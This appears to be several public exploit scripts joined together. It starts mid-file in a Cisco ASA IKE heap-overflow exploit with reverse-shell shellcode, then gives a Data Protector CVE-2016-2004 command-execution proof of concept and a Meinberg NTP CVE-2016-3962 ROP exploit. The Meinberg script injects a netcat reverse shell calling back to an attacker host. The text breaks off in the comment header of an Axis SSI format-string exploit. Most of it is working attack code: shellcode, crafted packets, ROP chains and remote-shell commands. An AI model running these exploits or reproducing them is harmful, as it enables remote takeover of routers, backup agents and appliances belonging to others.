    "\xf3\xa5\x31\xdb\x6a\x03\x68\x00\x20\x00\x00\x53\x50\x68\xfd\xa8"
    "\xff\x09\xb8\xf0\xb7\x06\x08\xff\xd0\x83\xc4\x14\x61\x31\xc0\xc3"
    "\xe8\xd5\xff\xff\xff\x55\x89\xe5\x81\xec\x10\x04\x00\x00\xe9\xb1"
    "\x00\x00\x00\x58\x89\x85\xfc\xfb\xff\xff\x50\xb8\xf0\x07\x07\x08"
    "\xff\xd0\x83\xc4\x04\x89\x85\xf8\xfb\xff\xff\x89\xc3\x8b\x43\x04"
    "\x68\x80\xee\x36\x00\x68\x1a\x90\x01\x00\x53\xff\x50\x70\xc7\x44"
    "\x24\x04\x20\x90\x01\x00\x8b\x43\x04\xff\x50\x70\xc7\x85\xf4\xfb"
    "\xff\xff\x00\x40\x00\x00\x8d\x8d\xf4\xfb\xff\xff\x89\x4c\x24\x08"
    "\xc7\x44\x24\x04\x21\x90\x01\x00\x89\x1c\x24\x8b\x43\x04\xff\x50"
    "\x70\xbe\xc8\xef\xff\xff\x65\x8b\x06\x89\x98\x98\x00\x00\x00\xeb"
    "\x3a\xb8\x80\x0a\x0f\x08\xff\xd0\x5b\xc7\x43\x0c\xff\xff\xff\x17"
    "\x83\xc3\x14\xc7\x03\x65\x6e\x61\x62\xc7\x43\x04\x6c\x65\x5f\x31"
    "\xc7\x43\x08\x35\x00\x00\x00\x6a\x04\x68\x60\xc1\x52\x0a\xb8\x20"
    "\x68\x0f\x08\xff\xd0\x89\xec\x5d\x31\xc0\xc3\xe8\xc1\xff\xff\xff"
    "\x60\xc1\x52\x0a\xe8\x4a\xff\xff\xfftcp/CONNECT/3/@IP@/@PORT@\x00"
    )

# Spawns a reverse "/bin/sh"
shShellcode = (
    "\x60\xc7\x02\x90\x67\xb9\x09\x8b\x45\xf8\x8b\x40\x5c\x8b\x40\x04"
    "\x8b\x40\x08\x8b\x40\x04\x8b\x00\x85\xc0\x74\x3b\x50\x8b\x40\x08"
    "\x8b\x40\x04\x8d\x98\xd8\x00\x00\x00\x58\x81\x3b\xd0\xd4\x00\xe1"
    "\x75\xe4\x83\x7b\x04\x31\x74\xde\x89\xd8\x2d\x00\x01\x00\x00\xc7"
    "\x40\x04\x03\x01\x00\x00\xc7\x40\x0c\xd0\x00\x00\x00\xc7\x80\xf8"
    "\x00\x00\x00\xef\xcd\x1c\xa1\xb8\x40\xbc\x2a\x09\xff\xd0\x61\xb8"
    "\x02\x00\x00\x00\xcd\x80\x85\xc0\x0f\x85\xa1\x01\x00\x00\xba\xed"
    "\x01\x00\x00\xb9\xc2\x00\x00\x00\x68\x2f\x73\x68\x00\x68\x2f\x74"
    "\x6d\x70\x8d\x1c\x24\xb8\x05\x00\x00\x00\xcd\x80\x50\xeb\x31\x59"
    "\x8b\x11\x8d\x49\x04\x89\xc3\xb8\x04\x00\x00\x00\xcd\x80\x5b\xb8"
    "\x06\x00\x00\x00\xcd\x80\x8d\x1c\x24\x31\xd2\x52\x53\x8d\x0c\x24"
    "\xb8\x0b\x00\x00\x00\xcd\x80\x31\xdb\xb8\x01\x00\x00\x00\xcd\x80"
    "\xe8\xca\xff\xff\xff\x46\x01\x00\x00\x7f\x45\x4c\x46\x01\x01\x01"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00"
    "\x00\x54\x80\x04\x08\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x34\x00\x20\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xf2\x00\x00"
    "\x00\xf2\x00\x00\x00\x07\x00\x00\x00\x00\x10\x00\x00\x55\x89\xe5"
    "\x83\xec\x10\x6a\x00\x6a\x01\x6a\x02\x8d\x0c\x24\xbb\x01\x00\x00"
    "\x00\xb8\x66\x00\x00\x00\xcd\x80\x83\xc4\x0c\x89\x45\xfc\x68\x7f"
    "\x00\x00\x01\x68\x02\x00\x04\x38\x8d\x14\x24\x6a\x10\x52\x50\x8d"
    "\x0c\x24\xbb\x03\x00\x00\x00\xb8\x66\x00\x00\x00\xcd\x80\x83\xc4"
    "\x14\x85\xc0\x7d\x18\x6a\x00\x6a\x01\x8d\x1c\x24\x31\xc9\xb8\xa2"
    "\x00\x00\x00\xcd\x80\x83\xc4\x08\xeb\xc4\x8b\x45\xfc\x83\xec\x20"
    "\x8d\x0c\x24\xba\x03\x00\x00\x00\x8b\x5d\xfc\xc7\x01\x05\x01\x00"
    "\x00\xb8\x04\x00\x00\x00\xcd\x80\xba\x04\x00\x00\x00\xb8\x03\x00"
    "\x00\x00\xcd\x80\xc7\x01\x05\x01\x00\x01\xc7\x41\x04\x0a\x64\x00"
    "\x01\x66\xc7\x41\x08\x11\x5c\xba\x0a\x00\x00\x00\xb8\x04\x00\x00"
    "\x00\xcd\x80\xba\x20\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\x83"
    "\xc4\x20\x8b\x5d\xfc\xb9\x02\x00\x00\x00\xb8\x3f\x00\x00\x00\xcd"
    "\x80\x49\x7d\xf6\x31\xd2\x68\x2d\x69\x00\x00\x89\xe7\x68\x2f\x73"
    "\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x53\x8d\x0c\x24\xb8"
    "\x0b\x00\x00\x00\xcd\x80\x31\xdb\xb8\x01\x00\x00\x00\xcd\x80\x31"
    "\xc0\xc3"
        )


# SA Session
class Session(object):
    def __init__(self, host_port, id = None):
        if id == None:
            id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

        self._host, self._port = host_port
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._id = id
        self._mid = 1

        
        # Init session
        print("[+] Using session ID: " + self._id)
        self.send(self.make_SA())

        # Check if we got something
        res = self.recv()
        cookie = res[8:16]
        print("[+] Cookie: " + cookie)

        self._cookie = cookie

        # Enforce value of 0x21
        if ord(res[16]) != 0x21:
            raise Exception("Invalid router response")

        print("[+] New SA successfuly created.")


    # UPD socket helpers
    def send(self, buf):
        self._sock.sendto(buf, (self._host, self._port))

    def recv(self, size = 4096):
        data, addr = self._sock.recvfrom(size)
        return data

    def make_SA(self):
        buf = ""
        buf += self._id                  # Initiator SPI 
        buf += "\x00"*8                  # Responder SPI
        buf += "\x21"                    # next payload (security association)
        buf += "\x20"                    # version
        buf += "\x22"                    # exchange type
        buf += "\x08"                    # flags
        buf += "\x00"*4                  # message ID
        buf += "$$$$"                    # length

        # stolen from pcap
        # THIS IS SECURITY ASSOCIATION
        buf += "\x22\x00\x00\x6c\x00\x00\x00\x68\x01\x01\x00\x0b\x03\x00\x00\x0c\x01\x00\x00\x0c\x80\x0e\x01\x00\x03\x00\x00\x0c\x01\x00\x00\x0c\x80\x0e\x00\x80\x03\x00\x00\x08\x01\x00\x00\x03\x03\x00\x00\x08\x01\x00\x00\x02\x03\x00\x00\x08\x02\x00\x00\x02\x03\x00\x00\x08\x02\x00\x00\x01\x03\x00\x00\x08\x03\x00\x00\x02\x03\x00\x00\x08\x03\x00\x00\x01\x03\x00\x00\x08\x04\x00\x00\x02\x03\x00\x00\x08\x04\x00\x00\x05\x00\x00\x00\x08\x04\x00\x00\x0e"

        # THIS IS KEY EXCHANGE
        # this is the type of the next payload...
        buf += "\x28" # 0x28 = Nonce, 0x2b = vendor ID
        # KEY EXCHANGE DATA
        buf += "\x00\x00\x88\x00\x02\x00\x00\x50\xea\xf4\x54\x1c\x61\x24\x1b\x59\x3f\x48\xcb\x12\x8c\xf1\x7f\x5f\xd4\xd8\xe9\xe2\xfd\x3c\x66\x70\xef\x08\xf6\x56\xcd\x83\x16\x65\xc1\xdf\x1c\x2b\xb1\xc4\x92\xca\xcb\xd2\x68\x83\x8e\x2f\x12\x94\x12\x48\xec\x78\x4b\x5d\xf3\x57\x87\x36\x1b\xba\x5b\x34\x6e\xec\x7e\x39\xc1\xc2\x2d\xf9\x77\xcc\x19\x39\x25\x64\xeb\xb7\x85\x5b\x16\xfc\x2c\x58\x56\x11\xfe\x49\x71\x32\xe9\xe8\x2d\x27\xbe\x78\x71\x97\x7a\x74\x42\x30\x56\x62\xa2\x99\x9c\x56\x0f\xfe\xd0\xa2\xe6\x8f\x72\x5f\xc3\x87\x4c\x7c\x9b\xa9\x80\xf1\x97\x57\x92"
            
        # this is the Nonce payload
        buf += "\x2b"
        buf += "\x00\x00\x18\x97\x40\x6a\x31\x04\x4d\x3f\x7d\xea\x84\x80\xe9\xc8\x41\x5f\x84\x49\xd3\x8c\xee"
        # lets try a vendor id or three
        buf += "\x2b" # next payload, more vendor ID
        buf += "\x00" # critical bit
        vid = "CISCO-DELETE-REASON"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # another vendor id
        buf += "\x2b"	# next payload, more vendor ID
        buf += "\x00"	# critical bit
        vid = "CISCO(COPYRIGHT)&Copyright (c) 2009 Cisco Systems, Inc."
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # another vendor id
        buf += "\x2b"	# next payload, more vid
        buf += "\x00"	# crit
        vid = "CISCO-GRE-MODE"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # last vendor id
        buf += "\x00"	# next payload
        buf += "\x00"
        vid = "\x40\x48\xb7\xd5\x6e\xbc\xe8\x85\x25\xe7\xde\x7f\x00\xd6\xc2\xd3"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid
            
        return buf.replace("$$$$", struct.pack(">L", len(buf)))

    def make_cisco_fragment(self, flength, seqno, fragid, lastfrag, sploit):
        buf = ''
        buf += self._id               # Initiator SPI (random)
        buf += self._cookie                # Responder SPI
        buf += "\x84"                   # next payload
        buf += "\x20"                   # version
        buf += "\x25"                   # exchange type (2=identify protection)
        buf += "\x08"                   # flags
        buf += "\x00\x00\x00\x01"       # message ID
        buf += "ABCD"                   # length

        # PAYLOAD
        payload = ""
        payload += "\x00"               # next payload (none)
        payload += "\x00"               # critical bit
        payload += struct.pack(">H", flength) 		#payload_len)  # length
        payload += struct.pack(">H", fragid)        # frag ID
        payload += struct.pack("B", seqno)         # frag sequence
        payload += struct.pack("B", lastfrag)
        payload += sploit

        buf += payload
        return buf.replace("ABCD", struct.pack(">L", len(buf)))


    def send_fragment(self, flength, seqno, fragid, lastfrag, sploit):
        buf = self.make_cisco_fragment(flength, seqno, fragid, lastfrag, sploit)
        self.send(buf)

        # We're not supposed to receive anything if everything went
        # according to plan

    def make_cisco_option_list(self, opt_lst):
        buf = ''
        buf += self._id               # Initiator SPI (random)
        buf += self._cookie                # Responder SPI
        buf += "\x2f"                   # next payload
        buf += "\x20"                   # version
        buf += "\x25"                   # exchange type (2=identify protection)
        buf += "\x08"                   # flags
        buf += struct.pack(">I", 1)       # message ID
        buf += "ABCD"                   # length

        # PAYLOAD
        payload = ""
        payload += "\x00"               # next payload (none)
        payload += "\x00"               # critical bit
        payload += "EF" 		#payload_len)  # length
        payload += "\x03"               # CFG_SET
        payload += "\x00\x00\x00"       # Reserved

        total = 0x8
        for size, n in opt_lst:
            option  = struct.pack(">H", 0x6000)  #id
            option += struct.pack(">H", size)    # data length
            option += "A" * (size)

            total += (size + 4) * n
            payload += option * n
        buf += payload


        packet = buf.replace("ABCD", struct.pack(">L", len(buf))).replace("EF", struct.pack(">H", total))

        return packet


class Exploit(object):
    def __init__(self, host, revHost, revPort = 4444):
        self._host = host
        self._port = 500
        self._revHost = revHost
        self._revPort = revPort
        self._sessions = []


    # Create a new SA session
    def create_SA(self, id = None):

        # Create a new socket for session
        sess = Session((self._host, self._port), id)

        # Append to session list
        self._sessions.append(sess)

        return sess


    # Interact with reverse shell
    def interact(self):
        from telnetlib import Telnet

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        s.bind((self._revHost, self._revPort))
        s.listen(5)
        cli = s.accept()[0]
        s.close()
        print("[+] Got connect-back")

        t = Telnet()
        t.sock = cli
        t.interact()

    def buildPayload(self, cli = False):
        if cli == False:
            buf = bytearray(shShellcode)
            # Adjust IP and port
            buf[0x1ad:0x1b1] = socket.inet_aton(self._revHost)
            buf[0x1b5:0x1b7] = struct.pack(">H", self._revPort)
            Shellcode = bytes(buf)
        else:
            Shellcode = cliShellcode.replace("@IP@", self._revHost).replace("@PORT@", str(self._revPort))

        return Shellcode


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("[+] Usage: {0:s} <cisco IP> <attacker IP>[:port]".format(sys.argv[0]))
        sys.exit(0)

    #TODO: Check host
    host = sys.argv[1]
    revHost = sys.argv[2]

    # Parse revHost
    port = 4444
    if revHost.rfind(":") != -1:
        revHost, port = revHost.split(":")
        port = int(port)

    exploit = Exploit(host, revHost, port)
    sess1 = exploit.create_SA()
    sess2 = exploit.create_SA()

    n = 0xd6
    sess2.send_fragment(0x8 + n + 3, 1, 5, 0, "A" * (n + 3))

    # Send packets which will trigger the vulnerability
    # Weird packet to get a size of 0x1
    sess2.send_fragment(8 + -7, 0, 6, 1, "A" * (256 - 7))

    # This fragment will be the one being copied
    # during the memory corruption
    buf = "A" * (n - 0xd + 0x3)
    buf += struct.pack("<I", 0xef000000)
    buf += struct.pack("<I", 0x00a11ccd) # chunk magics
    buf += struct.pack("<I", 0xe100d4d0)
    buf += struct.pack("B", 0x61)       # set size from 0x31 to 0x61 in order to encompass the
                                        # adjacent chunk on free
    sess2.send_fragment(8 + n + 3, 1, 6, 0, buf)


    sess1.send_fragment(0x8 + 0xf8, 1, 0xeb, 0, "A" * 0xf8)
    pkt = sess1.make_cisco_option_list((
        (0xd0, 0x30), 
        )
    )

    # Defragment heap
    sess1.send(pkt)
    sess1.send(pkt)
    sess1.send(pkt)

    # Prepare a fake chunk
    buf  = ""
    buf += struct.pack("<I", 0x60)
    buf += struct.pack("<I", 0x102)
    buf += struct.pack("<I", 0xa11c0123)
    buf += struct.pack("<I", 0xe0)
    buf += "A" * 0xe8

    # And allocate it right after a 0x100 bytes hole
    sess1.send_fragment(0x8 + 0xf8, 2, 0xeb, 0, buf)

    # Trigger the overflow
    sess2.send_fragment(8 + -7, 3, 6, 1, "A" * (256 - 7))

    # Retrieve of fake freed block
    #buf = "\xcc" * (0xd0 - len(buf))
    buf = "\x00" * 0xd0


    buf += struct.pack("<I", 0xe100d4d0)
    buf += struct.pack("<I", 0x31)

    # this is a special writable address in the process
    # it translate into the following executable code:
    # nop / jmp [ecx]
    # since ecx happens to hold a pointer to a controlled buffer
    # the execution flow will be redirected to attacker controlled data
    what = 0xc821ff90

    # Just some writable address in the process which doesn't seem to be used
    where = 0xc8002000 - 0x8

    buf += struct.pack("<I", what)
    buf += struct.pack("<I", where)
    buf += struct.pack("<I", 0xf3ee0123)
    buf += struct.pack("<I", 0x0) * 5
    buf += struct.pack("<I", 0x5ee33210)
    buf += struct.pack("<I", 0xf3eecdef)
    buf += struct.pack("<I", 0x30)
    buf += struct.pack("<I", 0x132)
    buf += struct.pack("<I", 0xa11c0123)
    buf += struct.pack("<I", 0x100)
    buf += struct.pack("<I", 0x0) * 2

    # Second write-4 pointers
    # This is the address of the pointer to the "list_add" function
    # which will give us control of execution flow
    where = 0x0A99B7A4 - 0x10

    # This is the address where the opcode sequence "nop / jmp [ecx]" is located
    what = 0xc8002000

    buf += struct.pack("<I", what)
    buf += struct.pack("<I", where)

    buf += "\x00" * (0x128 - len(buf))
    
    # Try to chain a config list and a fragment packet
    packet = bytearray()
    packet += sess1._id               # Initiator SPI (random)
    packet += sess1._cookie                # Responder SPI
    packet += "\x2f"                   # next payload option list
    packet += "\x20"                   # version
    packet += "\x25"                   # exchange type (2=identify protection)
    packet += "\x08"                   # flags
    packet += struct.pack(">I", 1)       # message ID
    packet += "XXXX"                   # total length including header

    payload = bytearray()
    payload += "\x00"               # next payload (frag)
    payload += "\x00"               # critical bit
    payload += "\x00\x00" 	    # payload length
    payload += "\x03"               # CFG_SET
    payload += "\x00\x00\x00"       # Reserved

    size = 0x130
    option  = struct.pack(">H", 0x8400)  #id
    option += struct.pack(">H", size)    # data length
    option += "\x90" * 0x8 + buf

    payload += option * 0x10


    # Update payload length
    payload[2:4] = struct.pack(">H", len(payload))

    packet += payload

    # Update payload length
    packet[0x18:0x1C] = struct.pack(">I", len(packet))


    packet = bytes(packet)

    # Reallocate the fake freed 0x130 bytes chunk with controlled data
    # this way we can perform a write-4 memory corruption when freeing 
    # the subsequent memory
    sess1.send(packet)

    time.sleep(0.2)
    #raw_input()
    packet = bytearray()
    packet += sess1._id               # Initiator SPI (random)
    packet += sess1._cookie                # Responder SPI
    packet += "\x84"                   # next payload option list
    packet += "\x20"                   # version
    packet += "\x25"                   # exchange type (2=identify protection)
    packet += "\x08"                   # flags
    packet += struct.pack(">I", 1)       # message ID
    packet += "XXXX"                   # total length including header

    buf = exploit.buildPayload(cli = True) 
   
    flength = len(buf) + 0x8
    fragid = 0xeb
    seqno = 0x5
    lastfrag = 0
    payload = bytearray() 
    # Jump over garbage directly into shellcode (interpreted as jmp +0x6)
    payload += "\xeb"               # next payload (none)
    payload += "\x06"               # critical bit
    payload += struct.pack(">H", flength) 		#payload_len)  # length
    payload += struct.pack(">H", fragid)        # frag ID
    payload += struct.pack("B", seqno)         # frag sequence
    payload += struct.pack("B", lastfrag)
    payload += buf

    packet += payload

    # Update payload length
    packet[0x18:0x1C] = struct.pack(">I", len(packet))


    packet = bytes(packet)

    # Trigger the 2 write-4 and get code execution
    sess1.send(packet)

    # Hopefully we'll get something interesting
    exploit.interact()

  #!/usr/bin/python
#
# Exploit Title: Data Protector Encrypted Communications
# Date: 26-05-2016
# Exploit Author: Ian Lovering
# Vendor Homepage: http://www8.hp.com/uk/en/software-solutions/data-protector-backup-recovery-software/
# Version: A.09.00 and earlier
# Tested on: Windows Server 2008
# CVE : CVE-2016-2004
#

#   This proof of concept demonstrates that enabling encrypted control communication on
#   Data Protector agents does not provide any additional security.
#   As is provides no authentication it is not a viable workaround to prevent the
#   exploitation of well known Data Protector issues such as cve-2014-2623
#
#   This exploit establishes and unauthenticated encrypted communication channel to 
#   a Data Protector Agent and uses a well known unencrypted Data Protector vulnerability
#   to run arbitrary commands on the target.

#   Tested on Kali Linux 2 with python 2.7.9
#   Tested against Data Protector A.09.00 (Internal Build version 88) with encrypted control
#   communication enabled.
#   All other Data Protector settings are default.
#   Tested against Data Protector agent running on Windows 2008 R2
#   Also tested against Data Protector A.07
#
#   encrypted-dataprotector.py -e <ipaddress>
#
#   By default runs ipconfig on the target. 
#   Can take a little while to return. Have patience ;)
#
#   CVE-2016-2004

import socket
import ssl
import time
import struct
import argparse


parser = argparse.ArgumentParser(prog='test-encrypt.py')
parser.add_argument('-e', '--encrypt', dest='encrypt', action='store_true')
parser.add_argument('-p', '--port', type=int)
parser.add_argument('-c', '--command')
parser.add_argument('ipaddress')
parser.set_defaults(encrypt=False,port=5555)
args = parser.parse_args()

HOST = args.ipaddress
PORT = args.port

command = 'ipconfig'

if args.command:
    command = args.command

# initialise data
initdata = ("\x00\x00\x00\x48\xff\xfe\x32\x00\x36\x00\x37\x00\x00\x00\x20\x00"
        "\x31\x00\x30\x00\x00\x00\x20\x00\x31\x00\x30\x00\x30\x00\x00\x00"
        "\x20\x00\x39\x00\x30\x00\x30\x00\x00\x00\x20\x00\x38\x00\x38\x00"
        "\x00\x00\x20\x00\x6f\x00\x6d\x00\x6e\x00\x69\x00\x64\x00\x6c\x00"
        "\x63\x00\x00\x00\x20\x00\x34\x00\x00\x00\x00\x00")

OFFSET = 46
command = command.replace("\\", "\\\\")
command = command.replace("\'", "\\\'")
command_length = struct.pack(">I",OFFSET + len(command))
payload = command_length         +\
    "\x32\x00\x01\x01\x01\x01\x01\x01" +\
    "\x00\x01\x00\x01\x00\x01\x00\x01" +\
    "\x01\x00\x20\x32\x38\x00\x5c\x70" +\
    "\x65\x72\x6c\x2e\x65\x78\x65\x00" +\
    "\x20\x2d\x65\x73\x79\x73\x74\x65" +\
    "\x6d('%s')\x00" % command

def get_data(sock):
    response = ''
    recv_len =1
    
    while recv_len:
        data = sock.recv(4096)
        recv_len = len(data)
        response += data
        if recv_len < 4096:
            break
    
    return response

def get_dp_response(sock):

    print "===== Response ====="
    print

    while True:

        # Get information about response
        packed_length = sock.recv(4)
        if not packed_length: 
            break
        n = struct.unpack(">I", packed_length)[0]
        tmpresponse = sock.recv(n)
        tmpresponse = tmpresponse.replace("\n", "")
        tmpresponse = tmpresponse.replace("\x00", "")
        tmpresponse = tmpresponse.replace("\xff\xfe\x39\x20", "")
        if tmpresponse.upper().find("*RETVAL*") != -1:
            break
        else:
            print tmpresponse

    print
    print "===== End ====="
    print


client = socket.socket( socket.AF_INET, socket.SOCK_STREAM )

if args.encrypt:
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers('ALL')

try:
    client.connect(( HOST, PORT ))
    print "Connected" 

    if args.encrypt:
        # send data protector init string
        client.send(initdata)
        response = get_data(client)

        # setup tls
        client = context.wrap_socket(client)
        print "Encryption Enabled"
    
    # send payload
    client.send(payload)
    print "Sent Payload"
    print ""
    print "===== Command ====="
    print
    print command
    print
    get_dp_response(client)

    client.close()

except Exception as e:
    print '[*] Exception. Exiting.'
    print e
    client.close()


#!/usr/bin/python
#
# EDB Note: Source ~ https://github.com/securifera/CVE-2016-3962-Exploit
# EDB Note: More info ~ https://www.securifera.com/blog/2016/07/17/time-to-patch-rce-on-meinberg-ntp-time-server/
#
# 271 - trigger notifications
# 299 - copy user defined notifications

# Kernel Version: 2.6.15.1
# System Version: 530 
# Lantime configuration utility 1.27
# ELX800/GPS M4x V5.30p

import socket
import struct
import telnetlib
import sys
import time

if len(sys.argv) < 3:
	print "[-] <Host> <Callback IP> "
	exit(1)

	
host = sys.argv[1]
callback_ip = sys.argv[2]

print "[+] exploiting Meinburg M400"
port = 80

###################################################################
#
# Copy user_defined_notification to /www/filetmp
# Append reverse shell string to /file/tmp	
#
csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )

param = "A" * 0x2850

resp = "POST /cgi-bin/main HTTP/1.1\r\n"
resp += "Host: " + host + "\r\n"
resp += "User-Agent: Mozilla/5.0\r\n"
resp += "Accept: text/html\r\n"
resp += "Accept-Language: en-US\r\n"
resp += "Connection: keep-alive\r\n"
resp += "Content-Type: application/x-www-form-urlencoded\r\n"

system = 0x80490B0
exit = 0x80492C0
some_str = 0x850BDB8

#must have a listener setup to receive the callback connection on ip 192.168.60.232
# i.e. nc -v -l -p 4444
command = 'cp /mnt/flash/config/user_defined_notification /www/filetmp; echo "{rm,/tmp/foo};{mkfifo,/tmp/foo};/bin/bash</tmp/foo|{nc,' + callback_ip +'0,4444}>/tmp/foo;" >> /www/filetmp'

msg = "button=" + "A"*10028 
msg += struct.pack("I", system )
msg += struct.pack("I", exit )
msg += struct.pack("I", some_str )
msg += command + "\x00"

resp += "Content-Length: " + str(len(msg)) + "\r\n\r\n"
resp += msg
csock.send(resp)
csock.close()

time.sleep(1)

###################################################################
#
# Copy /www/filetmp to user_defined_notification	
# 
csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )

param = "A" * 0x2850

resp = "POST /cgi-bin/main HTTP/1.1\r\n"
resp += "Host: " + host + "\r\n"
resp += "User-Agent: Mozilla/5.0\r\n"
resp += "Accept: text/html\r\n"
resp += "Accept-Language: en-US\r\n"
resp += "Connection: keep-alive\r\n"
resp += "Content-Type: application/x-www-form-urlencoded\r\n"

send_cmd = 0x807ED88
system = 0x80490B0
exit = 0x80492C0
some_str = 0x850BDB8
ret = 0x804CE65

#stack pivot
stack_pivot = 0x8049488
msg = "button=" + "A" * 9756

msg += "B" * 28
msg += struct.pack("I", 0x7FFEE01A )       # ebp
msg += struct.pack("I", 0x0804ce64 )       # pop eax ; ret
msg += struct.pack("I", some_str - 0x100 ) # some place
msg += struct.pack("I", 0x080855cc )       # add dword ptr [eax + 0x60], ebp ; ret
msg += struct.pack("I", 0x080651d4 )       # inc dword ptr [ebx + 0x566808ec] ; ret
msg += struct.pack("I", ret ) * (71/4)

msg += struct.pack("I", send_cmd )
msg += struct.pack("I", exit )
msg += struct.pack("I", 0x80012111 )       # [eax + 0x60]
msg += struct.pack("I", some_str )         # buffer
msg += struct.pack("I", 0xffffffff )       # count
msg += "E" * 120

msg += struct.pack("I", 0xB1E8B434 )   # ebx
msg += struct.pack("I", some_str - 100 )   # esi
msg += struct.pack("I", some_str - 100 )   # edi
msg += struct.pack("I", some_str - 0x100 ) # ebp
msg += struct.pack("I", stack_pivot )      # mov esp, ebp ; ret
msg += "A" * 100

resp += "Content-Length: " + str(len(msg)) + "\r\n\r\n"
resp += msg
csock.send(resp)
csock.close

time.sleep(1)

###################################################################
#
# Trigger reverse shell	
# 
	
csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )

param = "A" * 0x2850

resp = "POST /cgi-bin/main HTTP/1.1\r\n"
resp += "Host: " + host + "\r\n"
resp += "User-Agent: Mozilla/5.0\r\n"
resp += "Accept: text/html\r\n"
resp += "Accept-Language: en-US\r\n"
resp += "Connection: keep-alive\r\n"
resp += "Content-Type: application/x-www-form-urlencoded\r\n"

send_cmd = 0x807ED88
system = 0x80490B0
exit = 0x80492C0
some_str = 0x850BDB8
ret = 0x804CE65

#stack pivot
stack_pivot = 0x8049488
msg = "button=" + "A" * 9756

msg += "B" * 28
msg += struct.pack("I", 0x7FFEE01A )       # ebp
msg += struct.pack("I", 0x0804ce64 )       # pop eax ; ret
msg += struct.pack("I", some_str - 0x100 ) # some place
msg += struct.pack("I", 0x080855cc )       # add dword ptr [eax + 0x60], ebp ; ret
msg += struct.pack("I", 0x080651d4 )       # inc dword ptr [ebx + 0x566808ec] ; ret
msg += struct.pack("I", ret ) * (71/4)

msg += struct.pack("I", send_cmd )
msg += struct.pack("I", exit )
msg += struct.pack("I", 0x800120f5 )       # [eax + 0x60]
msg += struct.pack("I", some_str )         # buffer
msg += struct.pack("I", 0xffffffff )       # count
msg += "E" * 120

msg += struct.pack("I", 0xB1E8B434 )   # ebx
msg += struct.pack("I", some_str - 100 )   # esi
msg += struct.pack("I", some_str - 100 )   # edi
msg += struct.pack("I", some_str - 0x100 ) # ebp
msg += struct.pack("I", stack_pivot )      # mov esp, ebp ; ret
msg += "A" * 100

resp += "Content-Length: " + str(len(msg)) + "\r\n\r\n"
resp += msg
csock.send(resp)
csock.close()

time.sleep(1)


print "[+] cleaning up"
###################################################################
#
# Kill all mains that are hung-up
#
csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )

param = "A" * 0x2850

resp = "POST /cgi-bin/main HTTP/1.1\r\n"
resp += "Host: " + host + "\r\n"
resp += "User-Agent: Mozilla/5.0\r\n"
resp += "Accept: text/html\r\n"
resp += "Accept-Language: en-US\r\n"
resp += "Connection: keep-alive\r\n"
resp += "Content-Type: application/x-www-form-urlencoded\r\n"

system = 0x80490B0
exit = 0x80492C0
some_str = 0x850BDB8

command = 'killall main'

msg = "button=" + "A"*10028 
msg += struct.pack("I", system )
msg += struct.pack("I", exit )
msg += struct.pack("I", some_str )
msg += command + "\x00"

resp += "Content-Length: " + str(len(msg)) + "\r\n\r\n"
resp += msg
csock.send(resp)
csock.close()

print "[+] enjoy"#!/usr/bin/env python2.7
# 
# [SOF]
#
# [Remote Format String Exploit] Axis Communications MPQT/PACS Server Side Include (SSI) Daemon
# Research and development by bashis <mcw noemail eu> 2016
#
# This format string vulnerability has following characteristic:
# - Heap Based (Exploiting string located on the heap)
# - Blind Attack (No output the remote attacker)(*)
# - Remotly exploitable (As anonymous, no credentials needed)
#
# (*) Not so 'Blind' after all, since the needed addresses can be predicted by statistic.
#
# This exploit has following characteristic:
# - Multiple architecture exploit (MIPS/CRISv32/ARM) [From version 5.20.x]
# - Modifying LHOST/LPORT in shellcode on the fly
# - Manual exploiting of remote targets
# - Simple HTTPS support
# - Basic Authorization support (not needed for this exploit)
# - FMS dictionary and predicted addresses for GOT free() / BSS / Netcat shellcode
# - Multiple shellcodes (ARM, CRISv32, MIPS and Netcat PIPE shell)
# - Exploiting with MIPS, CRISv32 and ARM shellcode will give shell as root
# - Exploiting with ARM Netcat PIPE shell give normally shell as Anonymous (5.2x and 5.4x give shell as root)
# - Multiple FMS exploit techniques
#   - "One-Write-Where-And-What" for MIPS and CRISv32
#     Using "Old Style" POP's
#     Classic exploit using: Count to free() GOT, write shellcode address, jump to shellcode on free() call
#     Shellcode loaded in memory by sending shellcode URL encoded, that SSI daemon decodes and keeps in memory.
#   - "Two-Write-Where-And-What" for ARM
#     1) "Old Style": Writing 1x LSB and 1x MSB by using offsets for GOT free() target address
#     2) "New Style": ARM Arch's have both "Old Style" (>5.50.x) )POPs and "New Style" (<5.40.x) direct parameter access for POP/Write
#     [Big differnce in possibilities between "Old Style" and "New Style", pretty interesting actually]
# - Another way to POP with "Old Style", to be able POPing with low as 1 byte (One byte with %1c instead of eight with %8x)
# - Exploit is quite well documented
#
# Anyhow,
# Everything started from this simple remote request:
#
# ---
# $ echo -en "GET /httpDisabled.shtml?&http_user=%p|%p HTTP/1.0\n\n" | netcat 192.168.0.90 80
# HTTP/1.1 500 Server Error
# Content-Type: text/html; charset=ISO-8859-1
#
# <HTML><HEAD><TITLE>500 Server Error</TITLE></HEAD>
# <BODY><H1>500 Server Error</H1>
# The server encountered an internal error and could not complete your request.
# </BODY></HTML>
# ---
#
# Which gave this output in /var/log/messages on the remote device:
#
# ---
